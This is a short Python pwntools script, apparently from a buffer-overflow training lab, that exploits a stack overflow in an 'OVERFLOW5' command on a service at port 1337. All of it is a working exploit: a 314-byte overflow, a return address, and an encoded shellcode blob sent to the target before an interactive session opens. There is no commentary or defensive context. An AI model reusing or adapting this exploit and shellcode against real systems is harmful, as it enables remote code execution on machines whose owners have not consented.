#!/usr/bin/env python3

from pwn import *

ip = "10.10.239.139"
port = 1337

prefix = "OVERFLOW5 "
offset = 314 
overflow = "A" * offset
retn = "\xeb\x11\x50\x62"
padding = ""
payload = ("\xfc\xbb\x3e\x7a\x92\x54\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xc2\x92\x10\x54\x3a"
"\x63\x75\xdc\xdf\x52\xb5\xba\x94\xc5\x05\xc8\xf8\xe9\xee\x9c"
"\xe8\x7a\x82\x08\x1f\xca\x29\x6f\x2e\xcb\x02\x53\x31\x4f\x59"
"\x80\x91\x6e\x92\xd5\xd0\xb7\xcf\x14\x80\x60\x9b\x8b\x34\x04"
"\xd1\x17\xbf\x56\xf7\x1f\x5c\x2e\xf6\x0e\xf3\x24\xa1\x90\xf2"
"\xe9\xd9\x98\xec\xee\xe4\x53\x87\xc5\x93\x65\x41\x14\x5b\xc9"
"\xac\x98\xae\x13\xe9\x1f\x51\x66\x03\x5c\xec\x71\xd0\x1e\x2a"
"\xf7\xc2\xb9\xb9\xaf\x2e\x3b\x6d\x29\xa5\x37\xda\x3d\xe1\x5b"
"\xdd\x92\x9a\x60\x56\x15\x4c\xe1\x2c\x32\x48\xa9\xf7\x5b\xc9"
"\x17\x59\x63\x09\xf8\x06\xc1\x42\x15\x52\x78\x09\x72\x97\xb1"
"\xb1\x82\xbf\xc2\xc2\xb0\x60\x79\x4c\xf9\xe9\xa7\x8b\xfe\xc3"
"\x10\x03\x01\xec\x60\x0a\xc6\xb8\x30\x24\xef\xc0\xda\xb4\x10"
"\x15\x4c\xe4\xbe\xc6\x2d\x54\x7f\xb7\xc5\xbe\x70\xe8\xf6\xc1"
"\x5a\x81\x9d\x38\x0d\xa4\x73\x0c\x1c\xd0\x71\x90\xae\x18\xff"
"\x76\xa4\x4a\xa9\x21\x51\xf2\xf0\xb9\xc0\xfb\x2e\xc4\xc3\x70"
"\xdd\x39\x8d\x70\xa8\x29\x7a\x71\xe7\x13\x2d\x8e\xdd\x3b\xb1"
"\x1d\xba\xbb\xbc\x3d\x15\xec\xe9\xf0\x6c\x78\x04\xaa\xc6\x9e"
"\xd5\x2a\x20\x1a\x02\x8f\xaf\xa3\xc7\xab\x8b\xb3\x11\x33\x90"
"\xe7\xcd\x62\x4e\x51\xa8\xdc\x20\x0b\x62\xb2\xea\xdb\xf3\xf8"
"\x2c\x9d\xfb\xd4\xda\x41\x4d\x81\x9a\x7e\x62\x45\x2b\x07\x9e"
"\xf5\xd4\xd2\x1a\x15\x37\xf6\x56\xbe\xee\x93\xda\xa3\x10\x4e"
"\x18\xda\x92\x7a\xe1\x19\x8a\x0f\xe4\x66\x0c\xfc\x94\xf7\xf9"
"\x02\x0a\xf7\x2b\x02\xac\x07\xd4")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

def start():
    if args.REMOTE:
        return remote(ip, port)

p = start()

def ret_leak():
    p.sendline(bytes(buffer, "latin-1"))

ret_leak()
p.interactive()
